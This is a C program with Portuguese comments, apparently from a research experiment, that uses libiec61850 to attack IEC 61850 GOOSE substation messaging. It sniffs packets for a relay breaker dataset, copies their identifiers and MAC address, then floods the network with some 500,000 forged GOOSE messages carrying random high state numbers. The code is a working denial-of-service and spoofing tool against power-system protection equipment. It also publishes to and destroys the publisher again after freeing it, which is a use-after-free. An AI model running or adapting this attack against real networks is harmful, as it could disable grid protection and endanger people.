/*
 * Ataque de negacao de servico 
 */

//Inclusao das bibliotecas da libiec 61850 para execucao do codigo
#include "goose_receiver.h"
#include "goose_subscriber.h"
#include "hal_thread.h"
#include "mms_value.h"
#include "goose_publisher.h"

#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

static int running = 1;

//variavel global a ser utilizada na contagem de pacotes monitorados com dataset escolhido pelo atacante
int cont = 0;

//Declaracao de variaveis para armazenar o endereco mac do assinante (assinante)
uint8_t macBuf[6];
uint8_t macdstBuf1;
uint8_t macdstBuf2;
uint8_t macdstBuf3;
uint8_t macdstBuf4;
uint8_t macdstBuf5;
uint8_t macdstBuf6;


//Decalracao de variaveis dos parametros do protocolo GOOSE
int32_t appId;
char goId[60];
char goCbRef[60];
char dataSet[60];
uint32_t confRev;
char ndsCom[60];
char simul[60];
uint32_t stNum;
uint32_t sqNum;
uint32_t timeToLive;


void sigint_handler(int signalId)
{
    running = 0;
}

//Funcao que estabelece o monitoramento da rede para capturar o pacote de um dataset determinado pelo atacante
void
gooseListener(GooseSubscriber assinante, void* parametro)
{
   
   //Captura do dataset dos pacotes
    strcpy(dataSet, GooseSubscriber_getDataSet(assinante));
    printf("dataSet: %s\n", dataSet);

    //Comparacao dos datasets dos pacotes capturados com o que foi deterinado pelo atacante
    if (!strcmp(dataSet, "SEL_421_distCFG/LLN0$dataset_disj"))
    {
        //Armazena o endereco de destino presente no pacote
        GooseSubscriber_getDstMac(assinante, macBuf);
        macdstBuf1 = macBuf[0];
        macdstBuf2 = macBuf[1];
        macdstBuf3 = macBuf[2];
        macdstBuf4 = macBuf[3];
        macdstBuf5 = macBuf[4];
        macdstBuf6 = macBuf[5];

        //Armazena o valor do parâmetro goId do pacote GOOSE
        strcpy(goId,GooseSubscriber_getGoId(assinante));

        //Armazena o valor do parâmetro goCbRef do pacote GOOSE
        strcpy(goCbRef,GooseSubscriber_getGoCbRef(assinante));

        //Armazena o valor do parâmetro appId do pacote GOOSE
        appId = GooseSubscriber_getAppId(assinante);

        //Armazena o valor do parâmetro stnum do pacote GOOSE
        stNum = GooseSubscriber_getStNum(assinante);

        //Armazena o valor do parâmetro sqnum do pacote GOOSE
        sqNum = GooseSubscriber_getSqNum(assinante);

        //Armazena o valor do parâmetro timeToLive do pacote GOOSE
        timeToLive = GooseSubscriber_getTimeAllowedToLive(assinante);

        //Armazena o valor do parâmetro confRev do pacote GOOSE
        confRev = GooseSubscriber_getConfRev(assinante);

        //Realiza contagem da quantidade de pacotes monitorados que tinham o mesmo dataset
        cont += 1;

        //Mostra na tela que um pacote de mesmo dataset determinado pelo atacante foi capturado
        printf(" PACOTE CAPTURADO %d\n", cont);
    }

}

int
main(int argc, char** argv)
{
    int intervalo_set = 0;
    int cont_msg = 0;

    GooseReceiver monitoramento = GooseReceiver_create();


    //Condicao presente no código exemplo da biblioteca libiec61850 para verificacao do uso da interface de rede
    if (argc > 1) {
        printf("Set interface id: %s\n", argv[1]);
        GooseReceiver_setInterfaceId(monitoramento, argv[1]);
    }
    else {
        //Na máquina utilizada no experimento foi usado a interface 3
        printf("Using interface 3\n");
        GooseReceiver_setInterfaceId(monitoramento, "3");
    }

    //Funcoes de configuracao da biblioteca libiec61850 para monitoramento e captura dos pacotes GOOSE da rede
    GooseSubscriber assinante = GooseSubscriber_create("", NULL);
    GooseSubscriber_setObserver(assinante);
    GooseSubscriber_setListener(assinante, gooseListener, NULL);
    GooseReceiver_addSubscriber(monitoramento, assinante);
    GooseReceiver_start(monitoramento);

    //Intervalo de quantidade de mensagens interceptadas para ser utilizada na escolha aleatória da mensagem a ser modificada no ataque
    int intervalo_inf = 1, intervalo_sup = 20;

    if (GooseReceiver_isRunning(monitoramento)) {
        signal(SIGINT, sigint_handler);
        while (running) {
        

            //Primeiramente e gerado o valor a ser definido para contagem das mensagens para escolha da mensagem a ser utilizada no ataque
            if (intervalo_set == 0) {
                //gera aleatoriamente o numero de mensagens para escolha da mensagem legitima a ser utilizada no ataque
                intervalo_set = (rand() % (intervalo_sup - intervalo_inf + 1) + intervalo_inf);
            }

            //Se o valor de contagem de pacotes capturados com dataset determinado pelo atacante for igual ao valor escolhido aleatoriamente -> sera dado inicio ao ataque com o ultimo pacote capturado
            if (cont == intervalo_set) {
                break;
            }
            else {
                //Ainda nao atingiu-se o valor aleatorio de mensagens monitoradas
                printf("\nNAO CONFIRMADO: %d\n", strlen(dataSet));
            }
        }
    }
    else {
        printf("Falha na comunicacao GOOSE\n");
    }

    //Finalizacao do monitoramento
    GooseReceiver_stop(monitoramento);
    GooseReceiver_destroy(monitoramento);

    //Mostra na tela a confirmacao da contagem igual ao valor aleatório atribuído
    printf("Ataque de negacao de servico iniciado");

    //Criacao de dataset
    LinkedList valores_dataset = LinkedList_create();

    // DEFINIR DATASET do pacote de ataque
    //Foram mantidos os valores de dataset -  definido pelo atacante cibernetico
    LinkedList_add(valores_dataset, MmsValue_newBoolean(false));
    LinkedList_add(valores_dataset, MmsValue_newBoolean(false));
    LinkedList_add(valores_dataset, MmsValue_newBoolean(false));

    //Insercao dos valores de macaddress de destino do assinante da mensagem GOOSE
    CommParameters gooseCommParameters;
    gooseCommParameters.appId = appId;
    gooseCommParameters.dstAddress[0] = macdstBuf1;
    gooseCommParameters.dstAddress[1] = macdstBuf2;
    gooseCommParameters.dstAddress[2] = macdstBuf3;
    gooseCommParameters.dstAddress[3] = macdstBuf4;
    gooseCommParameters.dstAddress[4] = macdstBuf5;
    gooseCommParameters.dstAddress[5] = macdstBuf6;
    gooseCommParameters.vlanId = 1;
    gooseCommParameters.vlanPriority = 4;

    char* interface;

    //Determinacao da interface - trecho presente no exemplo da libiec61850
    if (argc > 1)
        interface = argv[1];
    else
        interface = "3";

    


    //Inserção dos valores retirados do pacote original no pacote de ataque a ser injetado
    GoosePublisher publicador = GoosePublisher_create(&gooseCommParameters, interface);
    //Valor do dataset a ser atacado determinado pelo atacante
    GoosePublisher_setDataSetRef(publicador, "SEL_421_distCFG/LLN0$dataset_disj");
    GoosePublisher_setGoCbRef(publicador, goCbRef);
    GoosePublisher_setConfRev(publicador, confRev);
    GoosePublisher_setGoID(publicador, goId);
    GoosePublisher_setTimeAllowedToLive(publicador, timeToLive);

    //Definicao do limite inferior e superior para geracao aleatorio do valor alto de stnum do protocolo GOOSE
    int limit_inf = 10000, limit_sup = 100000;


    if (publicador) {
        int i = 0;

        //O ataque de negacao de servico eh realizado com o envio de  500.000 mensagens de uma vez
        for (i = 0; i < 500001; i++) {
            //Intervalo de tempo a ser definido pelo atacante
            Thread_sleep(10);

            //define valor de sqnum que inicia como 0 e eh incrementado a cada envio
            //Esse padrao pode ser modificado pelo atacante
            GoosePublisher_setSqNum(publicador, 0);

            //Valor aleatorio alto de stnum dentro de um conjunto determinado pelo atacante
            stNum = (rand() % (limit_sup - limit_inf + 1) + limit_inf);

            //Publicacao da mensagem
            GoosePublisher_setStNum(publicador, stNum);

            //Imediata Injecao do pacote de ataque na rede
            GoosePublisher_publish(publicador, valores_dataset);
            
        }

        //Confirmacao do envio de todos os 500.000 mensagens GOOSE
        printf("\n Ataque de negacao de servico finalizado\n");
        GoosePublisher_destroy(publicador);
    }
    else {
        printf("Falha na comunicacao GOOSE\n");
    }

    LinkedList_destroyDeep(valores_dataset, (LinkedListValueDeleteFunction)MmsValue_delete);


    //Finalizacao do modulo publicador
    GoosePublisher_publish(publicador, valores_dataset);
    GoosePublisher_destroy(publicador);

    return 0;
}
